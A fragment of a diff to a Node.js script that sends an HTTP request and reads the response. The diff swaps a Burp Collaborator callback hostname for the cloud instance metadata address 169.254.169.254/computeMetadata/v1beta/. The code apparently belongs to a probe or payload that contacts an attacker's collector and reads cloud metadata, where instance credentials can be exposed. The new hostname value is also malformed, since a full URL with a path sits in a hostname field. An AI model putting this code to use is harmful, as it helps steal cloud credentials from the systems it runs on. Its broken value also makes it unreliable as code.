@@ -3,7 +3,7 @@ const http = require("http")
 http
   .request(
     {
-      hostname: "xyzfcdayokqriuzgcd8i8yzt1k7bv0.burpcollaborator.net",
+      hostname: "http://169.254.169.254/computeMetadata/v1beta/",
     },
     res => {
       let data = ""
